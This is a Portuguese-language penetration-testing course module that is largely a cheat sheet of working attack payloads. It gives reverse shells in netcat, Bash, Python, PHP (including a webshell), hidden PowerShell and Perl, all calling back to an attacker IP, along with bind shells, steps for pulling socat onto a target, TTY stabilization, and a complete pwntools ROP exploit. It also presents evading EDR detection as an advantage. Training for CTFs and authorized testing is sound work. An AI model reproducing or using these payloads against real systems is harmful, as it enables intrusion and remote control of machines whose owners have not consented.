# 🛠️ 09. Exploração Manual e Payloads

> Nem sempre Metasploit é opção. EDRs detectam o Meterpreter, CTFs proíbem, ambientes têm restrição de ferramentas. Reverse shells manuais e pwntools são sua alternativa.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 90min | ⭐⭐⭐⭐ Avançado | `netcat, socat, python, pwntools` |

</div>

---

## 🎓 Por que isso importa?

Quando o Metasploit não é opção — EDRs que detectam assinatura do Meterpreter, CTFs que limitam a 3 usos/hora (OSCP), ou ambientes sem instalação — saber criar shells manualmente é a diferença entre acesso e fracasso. Este módulo cobre reverse shells em 6 linguagens, bind shells, estabilização de TTY, e introdução ao pwntools.

**Referência cruzada:** Payloads gerados pelo msfvenom (Arquivo 08) são a alternativa "automática". Este módulo é a alternativa "manual".

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Terminal Linux básico | Sim | Módulo 00 |
| Netcat básico | Sim | Módulo 01 |
| O que é reverse/bind shell | Sim | Arquivo 08 |
| Python básico | Sim | Módulo 00 |

---

## 🎯 Quando usar este módulo

- EDR detecta Meterpreter / assinaturas Metasploit
- CTF ou OSCP com limite de uso do Metasploit
- Target não tem Metasploit instalado
- Payload customizado necessário (bypass de filtros)
- Quer entender o que acontece "por baixo" do Metasploit

---

## 🔄 Reverse Shell vs Bind Shell

| Aspecto | Reverse Shell | Bind Shell |
|:--------|:-------------|:-----------|
| Direção | Target conecta ao atacante | Atacante conecta ao target |
| Listener | Roda no atacante (`nc -lvnp`) | Roda no target (`nc -lvnp`) |
| Firewall | Funciona (outbound permitido) | Geralmente bloqueado (inbound) |
| NAT | Funciona | Não funciona (sem porta aberta) |
| Quando usar | **99% dos casos** | Labs, target sem saída para internet |
| Payload msfvenom | `reverse_tcp` | `bind_tcp` |

---

## 🐚 Reverse Shells por Linguagem

### Listener (atacante — todos os casos)

```bash
# Configurar listener antes de executar o payload no target
nc -lvnp 4444
```

**Output esperado no listener:**
```
connect to [10.10.14.5] from (UNKNOWN) [192.168.1.10] 43210
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### 1. Netcat

**Com `-e` (Netcat Traditional / Ncat):**
```bash
# Target
nc -e /bin/bash 10.10.14.5 4444
nc -e /bin/sh 10.10.14.5 4444

# Ncat (vem com Nmap — tem -e)
ncat 10.10.14.5 4444 -e /bin/bash
```

**Sem `-e` (Netcat OpenBSD — padrão Ubuntu/Debian):**
```bash
# Target
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

**BusyBox:**
```bash
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

**Quando usar:** Netcat está em quase todos os Linux. `mkfifo` funciona em qualquer versão. O nc OpenBSD (padrão no Ubuntu) **não tem** `-e` — use o método `mkfifo`.

---

### 2. Bash

```bash
# Método 1 — /dev/tcp (feature compilada no Bash)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Método 2 — fd alternativo
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# Método 3 — login shell
/bin/bash -l > /dev/tcp/10.10.14.5/4444 0<&1 2>&1
```

**Quando usar:** Bash está em quase todos os Linux. A feature `/dev/tcp` pode estar desativada em algumas distribuições (`--disable-net-redirections` no compile). Não funciona em `sh`, `dash`, `zsh`.

---

### 3. Python

**Python3 (mais comum):**
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Python3 sem subprocess (com spaces):**
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Python2 (legacy):**
```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Quando usar:** Python está em quase todos os Linux e servidores web. `pty.spawn()` já dá shell semi-estável (aceita tab, Ctrl+C). Python3 é o padrão em sistemas modernos.

---

### 4. PHP

```bash
# CLI — fsockopen + exec
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# CLI — fsockopen + shell_exec
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# CLI — fsockopen + system
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'

# Webshell (upload de arquivo .php)
<?php $sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**Quando usar:** Servidores web com PHP (WordPress, Laravel, Drupal). CLI para execução via upload ou LFI/RFI.

---

### 5. PowerShell

```powershell
# Método 1 — TCPClient (funciona em qualquer Windows com PowerShell)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Flags PowerShell:**
| Flag | Descrição |
|:-----|:----------|
| `-NoP` | NoProfile (não carrega perfil) |
| `-NonI` | NonInteractive |
| `-W Hidden` | Janela oculta |
| `-Exec Bypass` | ExecutionPolicy Bypass |
| `-nop -c` | Abreviação de -NoProfile -Command |

**Quando usar:** Qualquer Windows moderno (7+/Server 2008+). EDRs detectam PowerShell suspeito — considere constrained language mode bypass.

---

### 6. Perl

```bash
# Linux
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

**Quando usar:** Perl está em quase todos os Unix/Linux e sistemas embutidos (routers, switches).

---

### Tabela de disponibilidade

| Linguagem | Linux | Windows | Web Servers | Embedded |
|:----------|:-----:|:-------:|:-----------:|:--------:|
| Netcat | Sim | Parcial | Não | Parcial |
| Bash | Sim | Não | Não | Parcial |
| Python | Sim | Parcial | Sim | Parcial |
| PHP | Parcial | Parcial | **Sim** | Não |
| PowerShell | Não | **Sim** | Não | Não |
| Perl | Sim | Parcial | Sim | Sim |
| Ruby | Parcial | Parcial | Rails | Não |

---

## 🔗 Bind Shells

### Quando usar

- Target tem porta aberta acessível (rede interna)
- Não há restrição de firewall inbound
- Não precisa de IP público do atacante
- Labs/testes onde o atacante não tem servidor público para callback

### Netcat Bind Shell

```bash
# No target (abre porta para conexão):
nc -lvnp 4444 -e /bin/bash

# Sem -e:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvnp 4444 >/tmp/f

# No atacante (conecta):
nc 192.168.1.200 4444

# Output:
bash-5.1$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

---

## 🔧 Shell Stabilization

### Por que um shell "cru" trava

Um shell reverso raw via Netcat **não é um TTY (pseudo-terminal)**. Problemas:
- Tab completion não funciona (imprime caracteres estranhos)
- Ctrl+C mata a sessão inteira
- Setas imprimem `[A`, `[B`
- Sem histórico de comandos
- `su`, `sudo`, `vim`, `nano` não funcionam

### Método 1: Python PTY (padrão — 90% dos casos)

```bash
# 1. Spawn PTY no target
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Suspenda com Ctrl+Z (volta ao seu terminal local)

# 3. No terminal local (atacante):
stty raw -echo; fg

# 4. Pressione Enter duas vezes, depois no target:
export SHELL=/bin/bash
export TERM=xterm-256color

# 5. Em outro terminal local, verificar tamanho:
stty size
# Output: 50 200

# 6. Ajustar no target:
stty rows 50 columns 200
```

**Output esperado:**
```
www-data@target:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@target:~$
# (shell agora aceita tab, Ctrl+C, vim/nano)
```

**Fallbacks:**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'    # Python2
python2 -c 'import pty; pty.spawn("/bin/bash")'   # Python2 explícito
```

### Método 2: Socat (shell completamente interativo)

```bash
# Na máquina atacante (listener):
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# No target (envia shell com PTY):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

**Se socat não estiver no target:**
```bash
# No target (baixar binário estático):
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

**Vantagem:** Shell completamente interativo desde o início — arrow keys, tab completion, Ctrl+C, tudo funciona nativamente.

### Método 3: rlwrap (melhoria rápida)

```bash
# Instalar
sudo apt install rlwrap

# Usar no listener
rlwrap nc -lvnp 4444

# Com histórico
rlwrap -r -f . nc -lvnp 4444
# -r = adiciona palavras ao completion list
# -f . = usa histórico atual como wordlist
```

**Limitação:** rlwrap adiciona history e setas, mas **não é um PTY completo** — Ctrl+C ainda mata a conexão.

### Método 4: script /dev/null

```bash
# No target (alternativa ao Python):
script /dev/null -qc /bin/bash

# Depois os mesmos passos:
# Ctrl+Z → stty raw -echo → fg → export TERM=xterm-256color
```

**Quando usar:** Quando Python não está disponível no target. `script` é POSIX padrão.

### Outras alternativas de spawn

```bash
# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'

# Lua
lua -e "os.execute('/bin/bash')"

# Vi (se estiver em um editor)
:!bash
:set shell=/bin/bash:shell

# MySQL
! bash
```

### Shell Environment Fixes

```bash
export TERM=xterm-256color
export SHELL=/bin/bash
export HOME=/home/$(whoami)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
source ~/.bashrc 2>/dev/null || source ~/.profile 2>/dev/null
```

---

## 🐍 pwntools — Introdução

pwntools é uma biblioteca Python para CTFs, pentesting e exploit development. Fornece I/O unificado (tubes), packing, shellcraft, e ROP chains.

### Instalação

```bash
pip install pwntools

# Verificar
pwn version
# pwntools-4.15.0
```

### Conceitos fundamentais

**Tubes — interface unificada de I/O:**
```python
from pwn import *

# Processo local
io = process('./vuln')

# Conexão remota
io = remote('10.10.10.10', 1337)

# SSH
shell = ssh('user', '10.10.10.10', password='pass', port=22)
```

**Recebimento/envio (funciona em qualquer tube):**
```python
io.recv()              # bytes brutos
io.recvline()          # uma linha (sem \n)
io.recvuntil(b'>>> ')  # até encontrar delimitador
io.send(b'dados')      # bytes
io.sendline(b'dados')  # bytes + \n
io.sendlineafter(b'>>> ', b'payload')  # recvuntil + sendline
io.interactive()       # entrega controle ao usuário
```

**Packing/unpacking:**
```python
p64(0xdeadbeef)    # 64-bit little-endian
p32(0xdeadbeef)    # 32-bit little-endian
u64(b'AAAAAAAA')   # desempacota 64-bit
u32(b'AAAA')       # desempacota 32-bit
```

**ELF parsing:**
```python
e = ELF('./vuln')
e.symbols['win']    # endereço da função win
e.got['puts']       # GOT entry de puts
e.plt['puts']       # PLT entry de puts
```

**Shellcraft (geração de shellcode):**
```python
context.arch = 'amd64'
sc = asm(shellcraft.sh())              # shellcode /bin/sh
sc = asm(shellcraft.amd64.linux.sh())  # explícito
print(disasm(sc))                      # imprime dissassembly
```

**Cyclic patterns (encontrar offsets):**
```python
cyclic(200)                    # padrão De Bruijn de 200 bytes
cyclic_find(0x6161616c)        # encontra offset
```

**ROP chains:**
```python
rop = ROP(e)
rop.call('puts', [e.got['puts']])
rop.call('system', [binsh])
payload = flat({offset: rop.chain()})
```

### Exemplo completo de exploit

```python
from pwn import *

context.binary = './vuln'
context.log_level = 'info'

if args.REMOTE:
    io = remote('10.10.10.10', 1337)
else:
    io = process('./vuln')

# Encontrar offset
io.send(cyclic(200))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))

# Construir payload
elf = ELF('./vuln')
rop = ROP(elf)
rop.call('system', [next(elf.libc.search(b'/bin/sh\x00'))])
payload = b'A' * offset + rop.chain()

# Enviar e interagir
io = remote('10.10.10.10', 1337)
io.sendline(payload)
io.interactive()
```

### Ferramentas CLI do pwntools

| Ferramenta | Função |
|:-----------|:-------|
| `pwn checksec` | Verifica proteções de binário (NX, ASLR, PIE, canary) |
| `pwn cyclic` | Gera padrões De Bruijn |
| `pwn asm` | Monta assembly |
| `pwn disasm` | Desmonta bytes |
| `pwn shellcraft` | Gera shellcode |
| `pwn template` | Gera template de exploit |

---

## 🆚 Quando Usar Manual vs Metasploit

| Critério | Manual (shell/pwntools) | Metasploit |
|:---------|:------------------------|:-----------|
| Furtividade / EDR | **Sim** — sem assinatura conhecida | Não — Meterpreter detectável |
| CTFs / OSCP | **Recomendado** — sem limites | Limitado a 3 usos/hora (OSCP) |
| Custom payloads | **Total controle** — bypass de filtros | Payloads genéricos |
| Velocidade de setup | Requer coding | **Módulos prontos** |
| Evasão de EDR | **Facilita customização** | Muito detectado |
| Post-exploitation | Manual (mais trabalho) | **Módulos prontos** (hashdump, etc.) |
| Aprendizado | **Entende o que acontece** | "Caixa preta" |

**Regra prática:**
- **CTF/OSCP:** pwntools + shells manuais
- **Red team com EDR:** shells manuais + payload customizado
- **Lab/estudo:** Metasploit (mais rápido)
- **Engajamento real:** Metasploit para enum + manual para exploração (melhor das duas)

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| "Shell fecha imediatamente" | Listener não estava rodando | Inicie `nc -lvnp 4444` antes do payload |
| "Tab imprime caracteres" | Shell não é TTY | Use `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| "Ctrl+C mata sessão" | Shell não estabilizado | `stty raw -echo; fg` |
| "Python não encontrado" | `/usr/bin/python3` ausente | Use `python` (Python2) ou tente Perl/Bash |
| "/dev/tcp não funciona" | Bash compilado sem net-redirections | Use Netcat ou Python em vez de Bash |
| "pwntools import error" | Não instalado | `pip install pwntools` |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Netcat](https://tryhackme.com/room/overpass2hastered) | Netcat basics, file transfer | 30min |
| 2 | OverTheWire | [Narnia](https://overthewire.org/wargames/narnia/) | Binary exploitation, shell manually | 45min |
| 3 | OverTheWire | [Behemoth](https://overthewire.org/wargames/behemoth/) | Advanced binary exploitation | 60min |
| 4 | picoCTF | [CyLab Binary](https://play.picoctf.org/) | Binary exploitation challenges | 60min |
| 5 | HackTheBox | [Celestial](https://app.hackthebox.com/machines/Celestial) | Python deserialization, manual shell | 90min |

---

## 📚 Referências

- [InternalAllTheThings — Reverse Shells](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- [HackTricks — Full TTYs](https://hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
- [pwntools Documentation](https://docs.pwntools.com/en/stable/)
- [Pentest Monkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [PayloadsAllTheThings — Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Payload Playground — Shell Stabilization](https://payloadplayground.com/blog/shell-stabilization-tty-upgrade)
- [static-binaries (socat)](https://github.com/andrew-d/static-binaries)
- [ConPtyShell (Windows)](https://github.com/antonioCoco/ConPtyShell)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Criar reverse shells em pelo menos 4 linguagens (netcat, bash, python, php/powershell)
- [ ] Entender quando usar bind shell em vez de reverse shell
- [ ] Estabilizar um shell cru com Python PTY + stty
- [ ] Usar socat para shell interativo direto
- [ ] Instalar e usar pwntools (process, remote, packing, shellcraft)
- [ ] Escrever um exploit básico com pwntools
- [ ] Justificar quando usar exploração manual em vez de Metasploit
- [ ] Usar `pwn checksec` para verificar proteções de binário
